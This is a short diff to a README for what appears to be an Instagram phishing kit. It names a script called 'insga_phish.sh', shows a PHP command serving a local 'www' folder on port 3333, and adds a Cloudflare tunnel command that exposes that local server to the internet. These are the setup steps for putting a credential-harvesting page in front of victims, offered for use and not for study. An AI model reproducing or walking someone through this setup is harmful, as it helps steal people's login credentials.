@@ -31,3 +31,7 @@ apt install cloudflared
 `insga_phish.sh`
       or
 `php -d opcache.enable=0 -S 127.0.0.1:3333 -t www`
+
+## Cloudflare tunnel
+
+`cloudflared tunnel --url http://127.0.0.1:3333`
